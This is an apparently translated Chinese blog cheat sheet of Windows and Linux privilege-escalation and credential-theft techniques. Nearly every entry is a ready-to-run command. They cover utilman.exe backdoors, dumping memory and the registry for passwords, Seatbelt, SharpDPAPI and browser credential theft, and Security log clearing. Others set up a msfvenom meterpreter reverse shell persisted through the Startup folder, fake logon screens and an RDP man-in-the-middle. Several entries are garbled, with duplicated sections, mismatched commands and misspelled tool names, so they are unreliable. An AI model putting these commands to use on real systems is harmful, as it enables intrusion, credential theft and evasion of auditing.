<h3 id="Abusing-Services-via-SeIncreaseBasePriority"><a href="#Abusing-Services-via-SeIncreaseBasePriority" class="headerlink" title="Abusing Services via SeIncreaseBasePriority"></a>Abusing Services via SeIncreaseBasePriority</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">start &#x2F;realtime SomeCpuIntensiveApp.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：</p>
<p>找了一圈，只有这儿有相关内容：<a target="_blank" rel="noopener" href="https://github.com/gtworek/Priv2Admin">https://github.com/gtworek/Priv2Admin</a></p>
<h3 id="Abusing-Services-via-SeManageVolume"><a href="#Abusing-Services-via-SeManageVolume" class="headerlink" title="Abusing Services via SeManageVolume"></a>Abusing Services via SeManageVolume</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">只需编译并运行SeManageVolumeAbuse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a target="_blank" rel="noopener" href="https://github.com/xct/SeManageVolumeAbuse">https://github.com/xct/SeManageVolumeAbuse</a></p>
<h3 id="Abusing-Services-via-SeRelabel"><a href="#Abusing-Services-via-SeRelabel" class="headerlink" title="Abusing Services via SeRelabel"></a>Abusing Services via SeRelabel</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">WRITE_OWNER对资源的访问权限，包括文件和文件夹。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Run for privilege escalation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Abusing-Services-via-SeRestore"><a href="#Abusing-Services-via-SeRestore" class="headerlink" title="Abusing Services via SeRestore"></a>Abusing Services via SeRestore</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li><code>启动具有 SeRestore 权限的 PowerShell/ISE</code>.</li>
<li><code>使用Enable-SeRestorePrivilege 启用权限</code>.</li>
<li><code>将utilman.exe重命名为utilman.old</code></li>
<li><code>将cmd.exe重命名为utilman.exe</code></li>
<li><code>锁定控制台并按Win+U</code></li>
</ol>
<h3 id="Abuse-via-SeBackup"><a href="#Abuse-via-SeBackup" class="headerlink" title="Abuse via SeBackup"></a>Abuse via SeBackup</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>In Metasploit (msf &gt; prompt) 输入: <code>use auxiliary/server/capture/http_basic</code></p>
<p>In Metasploit (msf &gt; prompt) 输入: <code>set uripath x</code></p>
<p>In Metasploit (msf &gt; prompt) 输入: <code>run</code></p>
<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">在taskmgr中，右键单击“Image Name”栏中的“iexplore.exe”
并从弹出菜单中选择“创建转储文件”.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ol start="3">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">strings &#x2F;root&#x2F;Desktop&#x2F;iexplore.DMP | grep &quot;Authorization: Basic&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>选择复制 Base64 编码字符串</p>
<p>在命令提示符下键入： <code>echo -ne [Base64 String] | Base64-d</code></p>
<h3 id="Abusing-via-SeCreatePagefile"><a href="#Abusing-via-SeCreatePagefile" class="headerlink" title="Abusing via SeCreatePagefile"></a>Abusing via SeCreatePagefile</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">HIBR2BIN &#x2F;PLATFORM X64 &#x2F;MAJOR 6 &#x2F;MINOR 1 &#x2F;INPUT hiberfil.sys &#x2F;OUTPUT uncompressed.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a target="_blank" rel="noopener" href="https://github.com/MagnetForensics/Hibr2Bin">https://github.com/MagnetForensics/Hibr2Bin</a></p>
<h3 id="Abusing-via-SeSystemEnvironment"><a href="#Abusing-via-SeSystemEnvironment" class="headerlink" title="Abusing via SeSystemEnvironment"></a>Abusing via SeSystemEnvironment</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>.<code>load C:\dev\PrivEditor\x64\Release\PrivEditor.dll</code></p>
<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">TrustExec.exe -m exec -c &quot;whoami &#x2F;priv&quot; -f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：两个工具都没找到QAQ</p>
<h3 id="Abusing-via-SeTakeOwnership"><a href="#Abusing-via-SeTakeOwnership" class="headerlink" title="Abusing via SeTakeOwnership"></a>Abusing via SeTakeOwnership</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li><code>takeown.exe /f &quot;%windir%\system32&quot;</code></li>
<li><code>icalcs.exe &quot;%windir%\system32&quot; /grant &quot;%username%&quot;:F</code></li>
<li>将cmd.exe重命名为utilman.exe</li>
<li>锁定控制台并按Win+U</li>
</ol>
<h3 id="Abusing-via-SeTcb"><a href="#Abusing-via-SeTcb" class="headerlink" title="Abusing via SeTcb"></a>Abusing via SeTcb</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>​	<code>PSBits</code></p>
<p>​		Or</p>
<p>​	<code>PrivFu</code></p>
<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">psexec.exe -i -s -d cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Abusing-via-SeTrustedCredManAccess"><a href="#Abusing-via-SeTrustedCredManAccess" class="headerlink" title="Abusing via SeTrustedCredManAccess"></a>Abusing via SeTrustedCredManAccess</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>​	<code>.load C:\dev\PrivEditor\x64\Release\PrivEditor.dll</code></p>
<p>​		Or</p>
<p>​	<code>CredManBOF</code></p>
<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">TrustExec.exe -m exec -c &quot;whoami &#x2F;priv&quot; -f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Abusing-tokens-via-SeAssignPrimaryToken"><a href="#Abusing-tokens-via-SeAssignPrimaryToken" class="headerlink" title="Abusing tokens via SeAssignPrimaryToken"></a>Abusing tokens via SeAssignPrimaryToken</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>​	<code>JuicyPotato.exe</code></p>
<p>​		Or</p>
<p>​	<code>https://github.com/decoder-it/juicy_2</code></p>
<p>​	<code>https://github.com/antonioCoco/RoguePotato</code></p>
<h3 id="Abusing-via-SeCreatePagefile-1"><a href="#Abusing-via-SeCreatePagefile-1" class="headerlink" title="Abusing via SeCreatePagefile"></a>Abusing via SeCreatePagefile</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">flog -s 10s -n 200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>​	Or</p>
<pre class="line-numbers language-none"><code class="language-none">invoke-module LogCleaner.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：wela链接<a target="_blank" rel="noopener" href="https://github.com/Yamato-Security/WELA">https://github.com/Yamato-Security/WELA</a></p>
<p>日志伪造工具flog：<a target="_blank" rel="noopener" href="https://github.com/mingrammer/flog">https://github.com/mingrammer/flog</a></p>
<h3 id="Certificate-Abuse"><a href="#Certificate-Abuse" class="headerlink" title="Certificate Abuse"></a>Certificate Abuse</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abusing Certificate</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">ceritify.exe request &#x2F;ca:dc.domain.local\DC-CA &#x2F;template:User…<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Rubeus.exe asktgy &#x2F;user:CORP\itadmin &#x2F;certificate:C:\cert.pfx &#x2F;password:password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-Memory"><a href="#Password-Mining-in-Memory" class="headerlink" title="Password Mining in Memory"></a>Password Mining in Memory</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li><code>ps -ef | grep ftp;</code></li>
<li><code>gdp -p ftp_id</code></li>
<li><code>info proc mappings</code></li>
<li><code>q</code></li>
<li><code>dump memory /tmp/mem [start] [end]</code></li>
<li><code>q</code></li>
<li><code>strings /tmp/mem | grep passw</code></li>
</ol>
<h2 id="Password-Mining-in-Memory-1"><a href="#Password-Mining-in-Memory-1" class="headerlink" title="Password Mining in Memory"></a>Password Mining in Memory</h2><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>In Metasploit (msf &gt; prompt) 输入: <code>use auxiliary/server/capture/http_basic</code></p>
<p>In Metasploit (msf &gt; prompt) 输入: <code>set uripath x</code></p>
<p>In Metasploit (msf &gt; prompt) 输入: <code>run</code></p>
<ol start="2">
<li></li>
</ol>
<p>在taskmgr中，右键单击“Image Name”栏中的“iexplore.exe”</p>
<p>并从弹出菜单中选择“创建转储文件”.</p>
<ol start="3">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">strings &#x2F;root&#x2F;Desktop&#x2F;iexplore.DMP | grep &quot;Authorization: Basic&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>选择复制 Base64 编码字符串.</p>
<p>在命令提示符下键入: <code>echo -ne [Base64 String] | base64 -d</code></p>
<h3 id="Password-Mining-in-Registry"><a href="#Password-Mining-in-Registry" class="headerlink" title="Password Mining in Registry"></a>Password Mining in Registry</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>打开命令并输入:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon” &#x2F;v DefaultUsername<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>在命令提示符下键入:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon” &#x2F;v DefaultPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>请注意输出中的凭据</p>
<p>1. </p>
<p>在命令提示符下键入:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v ProxyUsername<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>在命令提示符下键入:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v ProxyPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol>
<li>注意输出中的凭据</li>
<li></li>
</ol>
<p>在命令提示符下键入:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\TightVNC\Server &#x2F;v Password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>在命令提示符下键入:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\TightVNC\Server &#x2F;v PasswordViewOnly<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>记下加密的密码并输入:</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Users\User\Desktop\Tools\vncpwd\vncpwd.exe [Encrypted Password]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>从输出中记下凭据.</p>
<h3 id="Password-Mining-in-General-Events-via-SeAudit"><a href="#Password-Mining-in-General-Events-via-SeAudit" class="headerlink" title="Password Mining in General Events via SeAudit"></a>Password Mining in General Events via SeAudit</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">flog -s 10s -n 200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">invoke-module LogCleaner.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-Security-Events-via-SeSecurity"><a href="#Password-Mining-in-Security-Events-via-SeSecurity" class="headerlink" title="Password Mining in Security Events via SeSecurity"></a>Password Mining in Security Events via SeSecurity</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">flog -s 10s -n 200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">wevtutil cl Security<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Startup-Applications"><a href="#Startup-Applications" class="headerlink" title="Startup Applications"></a>Startup Applications</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>In Metasploit (msf &gt; prompt) 输入: <code>use multi/handler</code></p>
<p>In Metasploit (msf &gt; prompt) 输入: <code>set payload windows/meterpreter/reverse_tcp</code></p>
<p>In Metasploit (msf &gt; prompt) 输入: <code>set lhost [Kali VM IP Address]</code></p>
<p>In Metasploit (msf &gt; prompt) 输入: <code>run</code></p>
<p>打开另一个命令提示符并键入:</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;[Kali VM IP Address] -f exe -o x.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">将 x.exe 放在“C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-McAfeeSitelistFiles"><a href="#Password-Mining-in-McAfeeSitelistFiles" class="headerlink" title="Password Mining in McAfeeSitelistFiles"></a>Password Mining in McAfeeSitelistFiles</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpUp.exe McAfeeSitelistFiles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpUp">https://github.com/GhostPack/SharpUp</a></p>
<h3 id="Password-Mining-in-CachedGPPPassword"><a href="#Password-Mining-in-CachedGPPPassword" class="headerlink" title="Password Mining in CachedGPPPassword"></a>Password Mining in CachedGPPPassword</h3><p>域名: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpUp.exe CachedGPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-DomainGPPPassword"><a href="#Password-Mining-in-DomainGPPPassword" class="headerlink" title="Password Mining in DomainGPPPassword"></a>Password Mining in DomainGPPPassword</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpUp.exe domianGPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-KeePass"><a href="#Password-Mining-in-KeePass" class="headerlink" title="Password Mining in KeePass"></a>Password Mining in KeePass</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe keepass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">KeeTheft.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：</p>
<p>seatbelt：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a></p>
<p>KeeTheft未找到</p>
<h3 id="Password-Mining-in-WindowsVault"><a href="#Password-Mining-in-WindowsVault" class="headerlink" title="Password Mining in WindowsVault"></a>Password Mining in WindowsVault</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe WindowsVault<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-SecPackageCreds"><a href="#Password-Mining-in-SecPackageCreds" class="headerlink" title="Password Mining in SecPackageCreds"></a>Password Mining in SecPackageCreds</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe SecPackageCreds<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-PuttyH操作系统tKeys"><a href="#Password-Mining-in-PuttyH操作系统tKeys" class="headerlink" title="Password Mining in PuttyH操作系统tKeys"></a>Password Mining in PuttyH操作系统tKeys</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe PuttyHostKeys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-RDCManFiles"><a href="#Password-Mining-in-RDCManFiles" class="headerlink" title="Password Mining in RDCManFiles"></a>Password Mining in RDCManFiles</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe RDCManFiles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-RDPSavedConnections"><a href="#Password-Mining-in-RDPSavedConnections" class="headerlink" title="Password Mining in RDPSavedConnections"></a>Password Mining in RDPSavedConnections</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe RDPSavedConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-MasterKeys"><a href="#Password-Mining-in-MasterKeys" class="headerlink" title="Password Mining in MasterKeys"></a>Password Mining in MasterKeys</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpDPAPI masterkeys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpDPAPI">https://github.com/GhostPack/SharpDPAPI</a></p>
<h3 id="Password-Mining-in-Browsers"><a href="#Password-Mining-in-Browsers" class="headerlink" title="Password Mining in Browsers"></a>Password Mining in Browsers</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpWeb.exe all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a target="_blank" rel="noopener" href="https://github.com/djhohnstein/SharpWeb/releases/tag/v1.2">https://github.com/djhohnstein/SharpWeb/releases/tag/v1.2</a></p>
<h3 id="Password-Mining-in-Files"><a href="#Password-Mining-in-Files" class="headerlink" title="Password Mining in Files"></a>Password Mining in Files</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SauronEye.exe -d C:\Users\vincent\Desktop\ –filetypes .txt .doc .docx .xls –contents –keywords password pass* -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a target="_blank" rel="noopener" href="https://github.com/vivami/SauronEye/releases/tag/v0.0.9">https://github.com/vivami/SauronEye/releases/tag/v0.0.9</a></p>
<h3 id="Password-Mining-in-LDAP"><a href="#Password-Mining-in-LDAP" class="headerlink" title="Password Mining in LDAP"></a>Password Mining in LDAP</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpLDAPSearch.exe &quot;(&amp;(objectClass&#x3D;user)(cn&#x3D;*svc*))&quot; &quot;sam用户名&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerView.ps1
Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p>批注：</p>
<p>sharpldapsearch：<a target="_blank" rel="noopener" href="https://github.com/mitchmoser/SharpLDAPSearch/releases/tag/v1.2">https://github.com/mitchmoser/SharpLDAPSearch/releases/tag/v1.2</a></p>
<p>powerview：好多个版本，应该是这个吧？<a target="_blank" rel="noopener" href="https://github.com/ericshoemaker/PowerView">https://github.com/ericshoemaker/PowerView</a></p>
<h3 id="Password-Mining-in-Clipboard"><a href="#Password-Mining-in-Clipboard" class="headerlink" title="Password Mining in Clipboard"></a>Password Mining in Clipboard</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">execute-assembly &#x2F;root&#x2F;SharpClipHistory.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/SharpClipHistory/releases/tag/v1.0">https://github.com/FSecureLABS/SharpClipHistory/releases/tag/v1.0</a></p>
<h3 id="Password-Mining-in-GMSA-Password"><a href="#Password-Mining-in-GMSA-Password" class="headerlink" title="Password Mining in GMSA Password"></a>Password Mining in GMSA Password</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">GMSAPasswordReader.exe –accountname SVC_SERVICE_ACCOUNT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a target="_blank" rel="noopener" href="https://github.com/rvazarkar/GMSAPasswordReader">https://github.com/rvazarkar/GMSAPasswordReader</a></p>
<h3 id="Delegate-tokens-via-RDP"><a href="#Delegate-tokens-via-RDP" class="headerlink" title="Delegate tokens via RDP"></a>Delegate tokens via RDP</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows&#x2F;Linux</p>
<p>类型:  Delegate tokens</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;fake_rdp.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">pyrdp-mitm.py 192.168.1.10 -k private_key.pem -c certificate.pem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：</p>
<p>fake_rdp：<a target="_blank" rel="noopener" href="https://github.com/cheeseandcereal/fake-rdp">https://github.com/cheeseandcereal/fake-rdp</a></p>
<p>pyrdp-mitm未找到QAQ</p>
<h3 id="Delegate-tokens-via-FTP"><a href="#Delegate-tokens-via-FTP" class="headerlink" title="Delegate tokens via FTP"></a>Delegate tokens via FTP</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows&#x2F;Linux</p>
<p>类型:  Delegate tokens</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">FakeFtpServer fakeFtpServer &#x3D; new FakeFtpServer();

fakeFtpServer.addUserAccount(new UserAccount(“user”, “password”, “c:\\data”));

FileSystem fileSystem &#x3D; new WindowsFakeFileSystem();

fileSystem.add(new DirectoryEntry(“c:\\data”));

fileSystem.add(new FileEntry(“c:\\data\\file1.txt”, “abcdef 1234567890”));

fileSystem.add(new FileEntry(“c:\\data\\run.exe”));

fakeFtpServer.setFileSystem(fileSystem);  

fakeFtpServer.start();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Fake-Logon-Screen"><a href="#Fake-Logon-Screen" class="headerlink" title="Fake Logon Screen"></a>Fake Logon Screen</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Delegate tokens</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">execute-assembly fakelogonscreen.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/fakelogonscreen/releases/tag/1.1">https://github.com/bitsadmin/fakelogonscreen/releases/tag/1.1</a></p>
<h3 id="Abusing-WinRM-Services"><a href="#Abusing-WinRM-Services" class="headerlink" title="Abusing WinRM Services"></a>Abusing WinRM Services</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Service</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">RogueWinRM.exe -p C:\windows\system32\cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RogueWinRM/releases/tag/1.1">https://github.com/antonioCoco/RogueWinRM/releases/tag/1.1</a></p>
